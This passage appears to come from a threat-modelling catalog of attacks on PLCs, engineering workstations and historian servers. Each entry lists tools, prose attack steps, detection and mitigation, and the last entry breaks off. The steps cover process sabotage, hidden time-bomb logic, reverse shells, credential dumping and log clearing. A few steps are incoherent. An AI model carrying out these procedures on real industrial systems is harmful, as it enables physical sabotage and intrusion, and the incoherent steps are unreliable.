- **Tools**: Bluetooth Sniffer, RSLogix Emulator, HC-05 Module
- **Scenario**: PLC allows Bluetooth connectivity for configuration. Attacker uploads logic via exploited pairing mechanism.
- **Attack Steps**: Step 1: Sniff Bluetooth traffic using Ubertooth One.Step 2: Identify PLC Bluetooth MAC and emulate using HC-05 Module.Step 3: Connect using default PIN (e.g., 1234).Step 4: Use RSLogix Emulator to upload logic.Step 5: Disable local alarms within logic.Step 6: Disconnect before detection.Step 7: Monitor impact during operational hours.
- **Detection**: Monitor unexpected BT pairing, disable BT after use
- **Solution**: Change default PINs, disable when idle
- **Tags**: Bluetooth, wireless logic

## Exploit of PLC Script Execution Environment

- **Attack Type**: Scripting Abuse
- **Target**: Script-capable PLCs
- **Vulnerability**: Open file shares used for config
- **MITRE**: T0835
- **Impact**: Repeated control command execution
- **Tools**: SMB Client, Notepad++, Python/Lua
- **Scenario**: PLC allows custom scripts in Python/Lua for advanced control. Attacker uploads malicious script via exposed file share.
- **Attack Steps**: Step 1: Locate open SMB share using Nmap and smbclient.Step 2: Access control directory containing PLC script configs.Step 3: Edit existing script in Notepad++ to include malicious loop (e.g., double pump run).Step 4: Save file with same name to overwrite.Step 5: Wait for script to run during cycle.Step 6: Monitor system pressure for overload.
- **Detection**: Monitor file access logs, check script diffs
- **Solution**: Lock down shares, hash scripts
- **Tags**: Lua, scripting, PLC share

## Manipulating PLC Bootloader via Serial Connection

- **Attack Type**: Bootloader Firmware Attack
- **Target**: Bootloader-accessible PLCs
- **Vulnerability**: Unauthenticated serial bootloader
- **MITRE**: T0846
- **Impact**: Persistent firmware compromise
- **Tools**: PuTTY, Binwalk, Flash Loader, Serial Cable
- **Scenario**: Attacker connects to the PLC’s bootloader via serial to overwrite firmware before OS loads.
- **Attack Steps**: Step 1: Locate serial debug port on PLC using public datasheet.Step 2: Connect laptop using Serial Cable and open PuTTY at correct baud rate.Step 3: Access bootloader menu.Step 4: Upload malicious firmware using Flash Loader with modified binary from Binwalk analysis.Step 5: Reboot PLC — it now runs the attacker’s firmware.Step 6: Observe altered logic during control cycles.
- **Detection**: Monitor bootloader events, hash check
- **Solution**: Lock bootloader or password-protect it
- **Tags**: bootloader, serial, firmware

## Exploiting PLC Emulator for Lab-to-Production Propagation

- **Attack Type**: Lab-to-Field Logic Injection
- **Target**: PLC Dev/Test Environment
- **Vulnerability**: Poor QA and project logic review
- **MITRE**: T0835
- **Impact**: Hidden logic goes into production
- **Tools**: Studio 5000 Emulator, Git Client, Logic Obfuscator
- **Scenario**: Attacker inserts malicious logic in lab environment that is later deployed to production PLCs unknowingly.
- **Attack Steps**: Step 1: Clone official PLC project repository using Git.Step 2: Open project in Studio 5000 Emulator and inject obfuscated logic using Logic Obfuscator.Step 3: Save and commit changes with misleading commit message.Step 4: Production engineer pulls and uploads new version to live PLC.Step 5: Logic activates after preset conditions.Step 6: Logic impact is attributed to software bug.
- **Detection**: Implement code review, QA sign-off
- **Solution**: Use Git commit signing and logic linting
- **Tags**: lab, emulator, logic staging

## Exploiting PLC Update via SD Card Auto-Execution Script

- **Attack Type**: PLC Logic Script Auto-Execution
- **Target**: PLCs with autoexec SD card support
- **Vulnerability**: Automatic execution without auth
- **MITRE**: T0835
- **Impact**: False readings and logic override
- **Tools**: SD Card, Ladder IDE, Text Editor
- **Scenario**: Attacker creates an SD card with autoexec logic scripts which PLC accepts and runs on boot.
- **Attack Steps**: Step 1: Use Ladder IDE to write harmful logic (e.g., false tank reading).Step 2: Save as autoexec.lgx or equivalent.Step 3: Use Text Editor to update config file that triggers script execution on boot.Step 4: Copy files to SD Card.Step 5: Insert into PLC and power cycle.Step 6: Script executes and loads logic without warning.Step 7: Observe change in control behavior.
- **Detection**: Disable autoexec, file integrity check
- **Solution**: Block SD boot without approval
- **Tags**: SD, autoexec, PLC script

## Malicious Logic Deployment via Exploited Remote Asset Manager

- **Attack Type**: Asset Manager Compromise
- **Target**: PLCs managed via asset platforms
- **Vulnerability**: No logic verification in push system
- **MITRE**: T0835
- **Impact**: Fleet-wide coordinated logic attack
- **Tools**: Asset Mgmt Console, Remote PowerShell, Logic Pusher
- **Scenario**: Attacker compromises centralized asset management server to push tampered logic to PLC fleet.
- **Attack Steps**: Step 1: Gain access to central asset management server via weak credentials.Step 2: Open Asset Console and locate update schedule.Step 3: Modify ladder logic file in asset deployment folder.Step 4: Push update using Remote PowerShell command to field PLCs.Step 5: Logic activates sabotage sequence on input trigger.Step 6: Engineer assumes change was part of routine update.
- **Detection**: Log and audit asset logic history
- **Solution**: Use digital signatures for updates
- **Tags**: asset platform, fleet logic

## Obfuscated Time-Bomb Logic Embedded in Weekly Update

- **Attack Type**: Time-Triggered Malicious Logic
- **Target**: Time-based programmable PLCs
- **Vulnerability**: No logic sanitization before deployment
- **MITRE**: T0835
- **Impact**: Scheduled logic sabotage
- **Tools**: RSLogix 5000, TimeDelay Block, Obfuscator
- **Scenario**: Attacker programs a time-triggered logic block that activates destructive behavior days after upload.
- **Attack Steps**: Step 1: Use RSLogix 5000 to build ladder logic with a hidden time comparison block.Step 2: Add obfuscation using Logic Obfuscator (renamed tags, nested blocks).Step 3: Embed logic into weekly project update.Step 4: Engineer uploads to PLC as part of normal change control.Step 5: Time reaches preset value (e.g., next Tuesday, 2 AM).Step 6: Malicious logic disables pump or actuator.Step 7: Appears as sudden logic failure.
- **Detection**: Analyze tag names and unused timers
- **Solution**: Use static analysis tools pre-deployment
- **Tags**: timebomb, scheduled sabotage

## PLC Logic Upload via Unsecured Wi-Fi Maintenance Tablet

- **Attack Type**: Wireless Maintenance Exploit
- **Target**: Wi-Fi connected maintenance systems
- **Vulnerability**: Unsecured wireless session
- **MITRE**: T0835
- **Impact**: Logic hijack during routine work
- **Tools**: Android Tablet, PLC App, Wi-Fi Pineapple
- **Scenario**: Maintenance tablet connects to PLC via Wi-Fi; attacker uses it to push new logic during service.
- **Attack Steps**: Step 1: Discover open Wi-Fi SSID used by tablet to talk to PLC.Step 2: Clone SSID using Wi-Fi Pineapple and capture tablet connection.Step 3: Use session hijack to gain access to PLC App on tablet.Step 4: Select the connected PLC and push new ladder logic with manipulated limits.Step 5: Disconnect tablet and restore network.Step 6: Logic remains inside PLC undetected.
- **Detection**: Wi-Fi MAC monitor, logic sync alerts
- **Solution**: Encrypt PLC app sessions, restrict tablet use
- **Tags**: tablet, wireless hijack

## Logic Backdoor via Reused Test Tag in Production Code

- **Attack Type**: Internal Tag-Based Trigger Logic
- **Target**: PLCs with test tags not removed
- **Vulnerability**: Debug code left in production
- **MITRE**: T0835
- **Impact**: Shutdown on trigger
- **Tools**: Studio 5000, Test Simulator, Logic Viewer
- **Scenario**: Malicious logic is hidden in a tag meant for debugging that remains in production deployment.
- **Attack Steps**: Step 1: Attacker creates logic block tied to tag named DEBUG_TRIGGER.Step 2: Links it to a shutdown instruction (e.g., disable output A1).Step 3: Leaves tag unused in normal conditions.Step 4: Logic is uploaded during version release.Step 5: Weeks later, attacker sets DEBUG_TRIGGER remotely or via HMI.Step 6: Output fails unexpectedly.Step 7: Engineer sees no visible logic flaw due to tag naming.
- **Detection**: Detect unused but active tags
- **Solution**: Scan for hidden logic triggers
- **Tags**: debug tag, logic backdoor

## Exploiting Vendor Cloud Sync to Inject Remote Logic

- **Attack Type**: Cloud Sync Injection
- **Target**: PLCs using cloud-sync configs
- **Vulnerability**: Cloud update accepted without 2FA
- **MITRE**: T0835
- **Impact**: Remote motor sabotage
- **Tools**: Vendor Cloud Portal, Obfuscated Ladder File, Cloud CLI
- **Scenario**: PLC config syncs with cloud automatically. Attacker gains access to cloud and uploads harmful logic file.
- **Attack Steps**: Step 1: Phish credentials to Vendor Cloud Portal.Step 2: Upload obfuscated ladder file containing reversed motor controls.Step 3: Use Cloud CLI to set priority flag for update.Step 4: Field PLC syncs to cloud and installs update silently.Step 5: Motor responds incorrectly to HMI inputs.Step 6: Sabotage appears as wiring issue.
- **Detection**: Log sync origins, hash verification
- **Solution**: Use access control and alerting on config sync
- **Tags**: cloud sync, vendor compromise

## PLC Firmware Downgrade to Known Vulnerable Version

- **Attack Type**: Downgrade Exploit
- **Target**: PLCs without firmware downgrade protection
- **Vulnerability**: Allows old version uploads
- **MITRE**: T0846
- **Impact**: Logic upload without control
- **Tools**: Vendor Firmware Archive, Flash Tool, SHA Checker
- **Scenario**: Attacker replaces firmware with older version that lacks logic verification protections.
- **Attack Steps**: Step 1: Download vulnerable firmware version from archive.Step 2: Modify it to accept unsigned logic files.Step 3: Flash it to PLC using Vendor Flash Tool.Step 4: Reboot PLC and upload rogue ladder logic.Step 5: Logic disables all output if temperature exceeds threshold.Step 6: Run SHA Checker to confirm hash change.Step 7: Monitor logic effect during heatwave.
- **Detection**: Monitor version regressions
- **Solution**: Lock firmware version and block downgrade
- **Tags**: downgrade, logic bypass

## Logic Hijack via Shared Engineering Laptop

- **Attack Type**: Device Sharing Exploit
- **Target**: Shared Engineering PCs
- **Vulnerability**: Lack of session isolation
- **MITRE**: T0835
- **Impact**: Covert logic change through shared access
- **Tools**: RSLogix, USB Keylogger, Logic Analyzer
- **Scenario**: Attacker uses shared access to engineering laptop to modify active PLC project.
- **Attack Steps**: Step 1: Install USB Keylogger on shared engineering laptop.Step 2: Wait for authorized engineer to log in.Step 3: Open RSLogix and edit last opened project to insert extra loop routine.Step 4: Save and close RSLogix.Step 5: Engineer unknowingly uploads this version during site work.Step 6: Use Logic Analyzer later to trigger the backdoor.Step 7: Control process misbehaves based on injected loop.
- **Detection**: Log access and last file edit timestamps
- **Solution**: Use isolated accounts and version locks
- **Tags**: shared device, user swap

## Malicious Logic Hidden in Comment Blocks

- **Attack Type**: Comment-Based Logic Trigger
- **Target**: Ladder Logic PLC
- **Vulnerability**: Comment fields not properly reviewed
- **MITRE**: T0835
- **Impact**: Stealth logic activation
- **Tools**: RSLogix 5000, Obfuscator, Logic Comment Tool
- **Scenario**: Attacker hides functional ladder logic disguised as comments or unused tags that are overlooked during review.
- **Attack Steps**: Step 1: Create logic block that disables alarms when a hidden tag is set.Step 2: Rename all labels to look like comments or debugging routines using Logic Comment Tool.Step 3: Obfuscate names with underscores or hex using Obfuscator (e.g., _init_0x01).Step 4: Upload logic to PLC during scheduled update.Step 5: Wait for attacker to remotely set the trigger value.Step 6: Logic executes while appearing as innocuous code.Step 7: Engineer reviewing ladder logic misses hidden block.
- **Detection**: Scan logic for inactive blocks with functional paths
- **Solution**: Apply linting tools to strip hidden logic
- **Tags**: comments, hidden code

## Logic Injection via Engineer's Cloud-Synced Laptop

- **Attack Type**: Cloud Drive Propagation
- **Target**: Cloud-connected Engineering Laptops
- **Vulnerability**: Cloud sync with no access control
- **MITRE**: T0835
- **Impact**: Logic hijack via cloud sync
- **Tools**: Google Drive, File Monitor, RSLogix
- **Scenario**: Engineer’s laptop syncs project files to cloud. Attacker modifies project in cloud and it syncs back to local machine.
- **Attack Steps**: Step 1: Compromise engineer’s Google Drive via phishing.Step 2: Access shared folder containing .ACD (RSLogix) project files.Step 3: Inject malicious rung to control motor cycle limits.Step 4: Save updated file with same name and timestamp.Step 5: Engineer opens project from synced folder.Step 6: Logic is uploaded to PLC without suspicion.Step 7: Attack triggers when runtime conditions match rung logic.
- **Detection**: Audit cloud access, use file integrity monitor
- **Solution**: Use local-only project storage or secure cloud
- **Tags**: cloud sync, logic hijack

## Exploiting Engineering Backup Routine

- **Attack Type**: Scheduled Backup Tampering
- **Target**: Engineering backup systems
- **Vulnerability**: No validation on restored backups
- **MITRE**: T0835
- **Impact**: Malicious rollback logic
- **Tools**: Backup Script (Bash/Batch), File Editor, SHA Checker
- **Scenario**: Attacker targets scheduled backup process that engineers use to recover and deploy PLC logic.
- **Attack Steps**: Step 1: Locate engineering backup server that holds PLC project files.Step 2: Inject logic into a backup version stored as .bak or .zip using a File Editor.Step 3: Keep filename and modified timestamp identical.Step 4: Engineer experiences PLC fault and reverts to backup.Step 5: Malicious logic executes once deployed to live environment.Step 6: Monitor backup directory changes using SHA Checker for integrity.Step 7: No alerts are triggered unless full comparison is done.
- **Detection**: Monitor file hashes of backup sets
- **Solution**: Validate backups via checksum before deployment
- **Tags**: backup abuse, recovery logic

## Logic Injection via Insider USB Drop on Locked PC

- **Attack Type**: Physical Insider Attack
- **Target**: Engineering PCs with USB access
- **Vulnerability**: File watchers that process media automatically
- **MITRE**: T0835
- **Impact**: Insider logic drop
- **Tools**: USB Drive, RSLogix File, Autorun Batch Script
- **Scenario**: Insider drops a malicious logic file via USB onto a locked PC that auto-scans drives and picks up project files.
- **Attack Steps**: Step 1: Insider prepares USB with malicious .ACD file.Step 2: Adds autorun batch script that silently moves file to default RSLogix project directory.Step 3: Drops USB in control room where engineering PC is logged in but screen-locked.Step 4: USB is scanned by system service that copies new files.Step 5: Next time engineer opens project, it is the modified version.Step 6: Logic includes small, time-based sabotage trigger.Step 7: Appears as if engineer deployed it.
- **Detection**: Restrict USB access, block autorun
- **Solution**: USB blocking, file validation routines
- **Tags**: insider, USB, autorun

## PLC Logic Injection via Mobile App Bluetooth Debug Mode

- **Attack Type**: Mobile App Logic Exploit
- **Target**: Mobile-connected PLC apps
- **Vulnerability**: Hidden app functionality
- **MITRE**: T0835
- **Impact**: App-enabled logic overwrite
- **Tools**: Android App Debugger, Bluetooth Spoofer, Logic Editor
- **Scenario**: Engineering mobile app has hidden debug mode that allows direct logic upload via Bluetooth.
- **Attack Steps**: Step 1: Reverse engineer mobile PLC configuration app using APKTool.Step 2: Enable hidden debug mode.Step 3: Use Bluetooth Spoofer to impersonate engineer’s phone.Step 4: Connect to PLC and open debug menu.Step 5: Inject new logic using app interface.Step 6: Monitor operation logs from mobile app.Step 7: Disconnect and close debug mode to cover tracks.
- **Detection**: Monitor Bluetooth pairing logs, disable debug mode
- **Solution**: Remove debug features from production apps
- **Tags**: Bluetooth, mobile app, reverse engineering

## Historian Server Compromise via SMB Exploitation

- **Attack Type**: Pivoting via Historian
- **Target**: Historian Server, Engineering Workstation
- **Vulnerability**: Outdated SMBv1, weak segmentation
- **MITRE**: T1210, T1075
- **Impact**: Full control of PLCs via pivoted access
- **Tools**: Metasploit, EternalBlue, Mimikatz
- **Scenario**: Attacker targets Windows-based Historian server vulnerable to SMBv1 exploit and uses it to access Engineering Workstation.
- **Attack Steps**: Step 1: Attacker gains access to SCADA network via phishing. Step 2: Scans for open ports on internal devices and detects SMBv1 on Historian server. Step 3: Launches EternalBlue exploit via Metasploit to gain remote shell. Step 4: Uses Mimikatz to extract credentials from memory. Step 5: Uses valid credentials to access Engineering Workstation via RDP. Step 6: Uploads malicious firmware or logic via Engineering Workstation tools.
- **Detection**: Windows Event Logs, Credential use patterns
- **Solution**: Disable SMBv1, Patch Windows, Segregate historian
- **Tags**: historian, smb, lateral-movement, workstation

## Credential Harvesting through Historian Web Interface

- **Attack Type**: Credential Theft & Pivoting
- **Target**: Historian Web UI
- **Vulnerability**: No MFA, Weak Credentials, Poor Access Control
- **MITRE**: T1552.001, T1078
- **Impact**: Engineer-level access obtained silently
- **Tools**: Burp Suite, Browser, PowerShell
- **Scenario**: Historian web UI exposed internally without MFA allows attacker to harvest stored credentials and pivot to engineering assets.
- **Attack Steps**: Step 1: Attacker already inside network (via guest Wi-Fi, USB drop). Step 2: Scans internal web interfaces using simple browser. Step 3: Finds Historian web login page and tries weak passwords (admin/admin). Step 4: Once in, downloads archived configs where credentials are stored. Step 5: Uses harvested credentials to access Engineering Workstation remotely. Step 6: Deploys reverse shell from Engineering Workstation to C2 server.
- **Detection**: Web logs, Config file changes, Unusual access
- **Solution**: Enforce MFA, Role-based access, Audit configs
- **Tags**: historian, web-ui, credentials, pivot

## Historian Server as Malware Staging Area

- **Attack Type**: Malware Pivot via Historian
- **Target**: Historian File Share
- **Vulnerability**: Shared folders, no scanning of sync points
- **MITRE**: T1105, T1071.001
- **Impact**: Initial foothold in OT via indirect pivot
- **Tools**: Netcat, PowerShell, Custom Dropper
- **Scenario**: Historian server is abused as a trusted file transfer point between IT and OT, allowing malware staging undetected.
- **Attack Steps**: Step 1: Attacker gains access to IT network. Step 2: Identifies shared folders on Historian used by OT and IT. Step 3: Uploads malware payload disguised as data file. Step 4: Engineering Workstation syncs folder and executes file unknowingly. Step 5: Payload launches reverse shell. Step 6: Attacker gains interactive access to OT environment.
- **Detection**: AV logs, file hash comparison, sync monitor
- **Solution**: Separate IT/OT transfer zones, scan shared folders
- **Tags**: historian, malware, ot-it-bridge

## Historian Server Exploitation via SQL Injection

- **Attack Type**: Database Exploit & Lateral Movement
- **Target**: Historian SQL Backend
- **Vulnerability**: SQLi on input field, Lack of input sanitization
- **MITRE**: T1505.002, T1071
- **Impact**: Secret access to control interface
- **Tools**: SQLmap, Burp Suite, Nmap
- **Scenario**: Web interface of Historian uses vulnerable SQL queries allowing DB extraction and lateral access to Engineering station logs.
- **Attack Steps**: Step 1: Attacker maps internal IPs and detects Historian web portal. Step 2: Uses Burp Suite to fuzz input fields. Step 3: Finds SQL injection vulnerability in trend data query. Step 4: Uses SQLmap to dump database, including Engineering logs and credentials. Step 5: Connects to Engineering Workstation using recovered credentials. Step 6: Deploys logic bomb via programming interface.
- **Detection**: WAF, query logs, DB audit
- **Solution**: Input validation, WAF, Principle of least privilege
- **Tags**: historian, sqli, database, engineer-pivot

## Remote Engineering Pivot via Historian RDP Exposure

- **Attack Type**: RDP Abuse for Engineer Access
- **Target**: Historian Server, Engineering Workstation
- **Vulnerability**: Weak RDP password, exposed RDP port
- **MITRE**: T1110.001, T1210
- **Impact**: Full system override possible
- **Tools**: Hydra, Rdesktop, BloodHound
- **Scenario**: Historian server exposed via RDP internally with weak password allows attacker to brute force access and pivot into Engineering assets.
- **Attack Steps**: Step 1: Attacker inside network scans ports and finds open RDP on Historian. Step 2: Uses Hydra to brute-force login (tries common passwords). Step 3: Logs into Historian using guessed credentials. Step 4: Uses BloodHound to enumerate AD relationships and privileges. Step 5: Identifies Engineering Workstation access path. Step 6: Uses pivoting tools to access Engineering Workstation remotely. Step 7: Loads unauthorized firmware to PLC via Engineering software.
- **Detection**: RDP logs, login anomaly, AD event trace
- **Solution**: Disable RDP, Strong passwords, Network segmentation
- **Tags**: historian, rdp, brute-force, engineer-access

## Pivot via Historian USB Autorun Malware

- **Attack Type**: Physical Access / Malware Staging
- **Target**: Historian Server (USB Port)
- **Vulnerability**: USB autorun allowed, insider access
- **MITRE**: T1200, T1059.001
- **Impact**: Full OT compromise
- **Tools**: USB Rubber Ducky, PowerShell Empire, Autorun.inf
- **Scenario**: Insider drops USB stick on Historian server with auto-executing malware that enables backdoor access to engineering systems.
- **Attack Steps**: Step 1: Insider crafts USB using USB Rubber Ducky and loads Autorun.inf to auto-execute malware. Step 2: Payload is created with PowerShell Empire to open reverse shell on execution. Step 3: USB plugged into Historian server; payload silently runs. Step 4: Attacker connects back and maintains access through reverse TCP shell. Step 5: Using PowerShell's Invoke-Command, attacker enumerates engineering systems on internal network. Step 6: Uses PsExec to move laterally to Engineering Workstation and execute payload. Step 7: Access to HMI/PLC control software is achieved.
- **Detection**: USB logs, reverse shell traffic
- **Solution**: Disable autorun, USB restrictions, endpoint AV
- **Tags**: usb, malware, lateral, engineer-pivot

## Compromise Historian via Insecure Remote Protocol

- **Attack Type**: Protocol Abuse for Lateral Movement
- **Target**: Historian, Engineering Station
- **Vulnerability**: Unencrypted protocols, shared VLAN
- **MITRE**: T1040, T1557
- **Impact**: Stealthy lateral movement
- **Tools**: Wireshark, Cain & Abel, Nmap
- **Scenario**: Historian communicates with other ICS systems using unencrypted Modbus, which is exploited to sniff credentials.
- **Attack Steps**: Step 1: Attacker installs Wireshark on a system in the same VLAN as Historian. Step 2: Observes unencrypted Modbus traffic from Historian to SCADA devices. Step 3: Captures Modbus packets and extracts device command history. Step 4: Uses Cain & Abel to sniff credentials in plaintext if passed via HTTP/web tools. Step 5: Extracted credentials are used with RDP or WinRM to log into Engineering Workstation. Step 6: Deploys PLC modification script from Engineering tools.
- **Detection**: Packet captures, session logs
- **Solution**: Encrypt traffic, network segmentation
- **Tags**: sniffing, modbus, historian, pivot

## Historian SQL Pivot via Credential Reuse

- **Attack Type**: Lateral Movement Using Shared SQL Creds
- **Target**: Historian DB, HMI SQL Interface
- **Vulnerability**: Default credentials reused
- **MITRE**: T1078, T1505.002
- **Impact**: Data tampering via credential pivot
- **Tools**: SQLmap, Metasploit, Credential Reuse Scripts
- **Scenario**: Historian and Engineering Workstation use same default database credentials, allowing attacker to reuse them.
- **Attack Steps**: Step 1: Attacker discovers Historian's SQL database running on default port. Step 2: Uses SQLmap to extract admin SQL credentials. Step 3: Attempts login to Engineering Workstation's HMI software using same credentials. Step 4: Successfully authenticates to SQL interface of HMI. Step 5: Uses SQL commands to inject malicious data tags or logic. Step 6: Inserts script to auto-reboot PLC at specific time.
- **Detection**: SQL logs, engineering logs
- **Solution**: Use separate creds per system
- **Tags**: sql, reuse, pivot, workstation

## Historian Pivot via Scheduled Task Injection

- **Attack Type**: Task Abuse for Persistence
- **Target**: Historian, Engineering Station
- **Vulnerability**: Scheduled tasks unmonitored
- **MITRE**: T1053, T1071.001
- **Impact**: Persistent and stealthy compromise
- **Tools**: Task Scheduler (schtasks.exe), PowerShell, SharpRDP
- **Scenario**: Attacker compromises Historian and injects scheduled tasks to pivot to Engineering Workstation on reboot.
- **Attack Steps**: Step 1: Gains initial shell on Historian using Metasploit. Step 2: Uses schtasks.exe to create a hidden task that runs PowerShell command at system startup. Step 3: Task contains encoded reverse shell payload targeting Engineering Workstation. Step 4: On reboot, scheduled task executes, reaching out to attacker-controlled listener. Step 5: Uses SharpRDP to exploit Engineering Workstation with newly gained foothold.
- **Detection**: Task audit logs, unusual reboot behavior
- **Solution**: Harden task policies, audit new tasks
- **Tags**: scheduled-task, pivot, stealth

## Compromise via Historian Backup File Leakage

- **Attack Type**: File Leakage and Credential Discovery
- **Target**: Historian Backup Share
- **Vulnerability**: Unsecured shares, password in backups
- **MITRE**: T1530, T1552
- **Impact**: Silent engineer pivot using leaked secrets
- **Tools**: SMBClient, strings, Mimikatz
- **Scenario**: Historian periodically backs up config files with embedded credentials, which attacker accesses via insecure share.
- **Attack Steps**: Step 1: Attacker finds open SMB share named \\historian-backups\config. Step 2: Uses SMBClient to connect anonymously and downloads .zip backup. Step 3: Unzips archive and runs strings command to extract human-readable content. Step 4: Finds Base64 encoded passwords inside config file. Step 5: Decodes using built-in PowerShell FromBase64String. Step 6: Uses credentials with RDP to access Engineering Workstation. Step 7: Uploads reverse shell payload via shared script editor.
- **Detection**: Share access logs, PowerShell decoding
- **Solution**: Encrypt backups, secure shares
- **Tags**: backup, smb, config, pivot

## Historian Java Applet Exploitation

- **Attack Type**: Client-Side Pivot via Legacy Applet
- **Target**: Historian Java Interface
- **Vulnerability**: RCE via outdated applets
- **MITRE**: T1189, T1059.005
- **Impact**: Remote control without direct credentials
- **Tools**: Malicious Java Applet, BeEF, Reverse Shell
- **Scenario**: Old Historian UI uses Java Applet vulnerable to RCE; attacker uses it to load remote shell.
- **Attack Steps**: Step 1: Attacker serves fake Historian web login via BeEF framework. Step 2: Traps engineer into visiting fake Historian UI. Step 3: Java Applet loads with hidden reverse shell Java class. Step 4: On execution, shell opens backdoor into Historian system. Step 5: Attacker uses netstat to identify communication with Engineering Workstation. Step 6: Uses Java-based socket tool to connect to remote services on Engineering Workstation.
- **Detection**: Java logs, user behavior tracking
- **Solution**: Remove legacy Java, browser isolation
- **Tags**: java, historian-ui, rce, pivot

## Pivoting via Historian OPC Tag Injection

- **Attack Type**: Tag Injection Pivot via Historian
- **Target**: Historian OPC Server
- **Vulnerability**: No validation on tag input
- **MITRE**: T1040, T1059.006
- **Impact**: Remote execution via data injection
- **Tools**: Prosys OPC UA Client, Scapy, Python Script
- **Scenario**: Attacker injects malicious OPC tag value that is auto-executed by Engineering Workstation automation script.
- **Attack Steps**: Step 1: Attacker installs Prosys OPC UA Client and connects to exposed OPC port on Historian. Step 2: Reads current tags and finds tag AutoExecScript. Step 3: Replaces tag value with encoded Python reverse shell. Step 4: Engineering Workstation periodically reads this tag for automation. Step 5: Script on Workstation executes the malicious tag value. Step 6: Remote shell is opened on Engineering system.
- **Detection**: Tag monitoring, automation logs
- **Solution**: Validate all OPC tag values
- **Tags**: opc, injection, engineering-access

## Historian Pivot Using VNC Service Hijack

- **Attack Type**: Remote Desktop Abuse
- **Target**: Historian (VNC Enabled)
- **Vulnerability**: No password on VNC
- **MITRE**: T1021.001, T1210
- **Impact**: Full pivot with minimal effort
- **Tools**: VNCViewer, Nmap, PsExec
- **Scenario**: Historian hosts legacy VNC server with no password, enabling lateral RDP jump to engineering interface.
- **Attack Steps**: Step 1: Attacker scans ports using Nmap, finds VNC on port 5900. Step 2: Uses VNCViewer to connect to Historian without password prompt. Step 3: From VNC session, opens cmd and downloads PsExec from attacker’s HTTP server. Step 4: Uses PsExec to push shell onto Engineering Workstation. Step 5: Access gained to ICS programming tools.
- **Detection**: VNC traffic logs, PsExec usage alerts
- **Solution**: Disable VNC, use encrypted RDP
- **Tags**: vnc, no-auth, pivot

## Pivot via Historian Windows Service Hijack

- **Attack Type**: Service Manipulation for Pivot
- **Target**: Historian Windows Services
- **Vulnerability**: Writable service paths
- **MITRE**: T1543, T1055
- **Impact**: Persistent pivot mechanism
- **Tools**: PowerShell, sc.exe, SharpService
- **Scenario**: Attacker modifies Windows service binary path on Historian to launch malicious code.
- **Attack Steps**: Step 1: After gaining access to Historian, attacker runs sc query to list services. Step 2: Identifies unprotected service running as SYSTEM. Step 3: Uses sc config to change service path to run reverse shell payload. Step 4: Restarts the service using sc stop and sc start. Step 5: Remote access shell opens; attacker scans subnet for Engineering Workstation. Step 6: Uses credentials harvested from memory with Mimikatz to login to Engineer station.
- **Detection**: Service logs, binary hash mismatch
- **Solution**: Protect services, restrict admin access
- **Tags**: windows-service, pivot, escalation

## Historian Dump Used for Password Cracking

- **Attack Type**: Data Theft + Offline Brute Force
- **Target**: Historian Filesystem
- **Vulnerability**: Hash storage, no monitoring
- **MITRE**: T1003, T1110
- **Impact**: Passwords cracked and reused
- **Tools**: 7zip, John the Ripper, Hashcat
- **Scenario**: Attacker exfiltrates encrypted password dump from Historian and cracks it offline to access Engineering systems.
- **Attack Steps**: Step 1: Access to Historian gained via phishing or remote shell. Step 2: Attacker compresses C:\Users and AppData folders using 7zip. Step 3: Transfers file to attacker server. Step 4: Extracts password hashes from SAM file. Step 5: Uses John the Ripper and Hashcat with password list to brute force hashes. Step 6: Reuses cracked credentials to login to Engineering Workstation.
- **Detection**: File integrity, auth attempt logs
- **Solution**: Encrypt and monitor hashes
- **Tags**: hash, crack, brute-force

## Historian Log Tampering to Conceal Pivot

- **Attack Type**: Log Manipulation to Mask Lateral Movement
- **Target**: Historian Logs & Event Viewer
- **Vulnerability**: No log forwarding, local-only logs
- **MITRE**: T1070.001
- **Impact**: Attacker remains undetected during pivot
- **Tools**: Wevtutil, PowerShell, EventLog Explorer
- **Scenario**: After pivoting through Historian, attacker manipulates system and application logs to hide evidence of accessing Engineering Workstation.
- **Attack Steps**: Step 1: Attacker has shell on Historian from prior compromise.Step 2: Runs wevtutil el to enumerate logs.Step 3: Uses wevtutil cl to clear selected logs (Security, RemoteDesktopServices).Step 4: Installs EventLog Explorer to manually scrub specific event entries.Step 5: Uses PowerShell script to remove entries containing attacker’s IP or username.Step 6: Pivots to Engineering Workstation without triggering alerts.Step 7: Modifies logs on Engineering system using same technique.
- **Detection**: Missing log entries, log gaps
- **Solution**: Use SIEM log forwarding, restrict log deletion
- **Tags**: logs, evasion, stealth, historian

## Remote Code Execution via Historian API

- **Attack Type**: API Misuse for Pivot
- **Target**: Historian REST API
- **Vulnerability**: Poor API design, no input validation
- **MITRE**: T1106, T1210
- **Impact**: Remote access and pivot via command injection
- **Tools**: Postman, curl, Python Requests
- **Scenario**: Historian exposes unauthenticated or loosely protected REST API endpoints that allow attackers to execute OS-level commands.
- **Attack Steps**: Step 1: Attacker scans network using Nmap and finds REST API on Historian at port 8080.Step 2: Uses Postman and curl to enumerate available endpoints.Step 3: Finds endpoint /execCmd?cmd= that runs OS commands (undocumented feature).Step 4: Sends cmd=netstat -an to confirm connectivity.Step 5: Sends cmd=PowerShell reverse shell payload to attacker-controlled server.Step 6: Uses PowerShell shell to access Engineering Workstation via WinRM.Step 7: Executes Invoke-WebRequest to pull down engineering malware payload.
- **Detection**: API gateway logs, endpoint enumeration
- **Solution**: API whitelisting, auth tokens, patching
- **Tags**: api, rce, historian, pivot

## Historian Used as Credential Replay Proxy

- **Attack Type**: Credential Replay and Relay
- **Target**: Historian (Relay Proxy)
- **Vulnerability**: No SMB signing, NTLM relay possible
- **MITRE**: T1557.001, T1071.001
- **Impact**: Auth bypass via credential relay
- **Tools**: Responder, NTLMRelayX, Nmap
- **Scenario**: Attacker leverages Historian's trusted position to perform NTLM relay attack against Engineering Workstation.
- **Attack Steps**: Step 1: Runs Responder on attacker machine to poison name resolution on SCADA network.Step 2: Historian attempts to resolve address; request is intercepted.Step 3: NTLMRelayX relays NTLM auth challenge to Engineering Workstation.Step 4: Engineering system accepts credentials from trusted Historian.Step 5: Attacker now has remote session on Engineering Workstation.Step 6: Uses built-in sc.exe to install remote command listener.Step 7: Uploads payload to manipulate PLC via engineering tool.
- **Detection**: DNS poisoning detection, SMB relay logging
- **Solution**: Enforce SMB signing, LLMNR/NetBIOS disable
- **Tags**: relay, ntlm, historian, pivot

## Historian Misconfiguration Enabling Remote Desktop Duplication

- **Attack Type**: Remote Screen Access for Pivot
- **Target**: Historian Remote Display
- **Vulnerability**: VNC mirroring to Engineering session
- **MITRE**: T1123, T1110.001
- **Impact**: Visual credential theft and session hijack
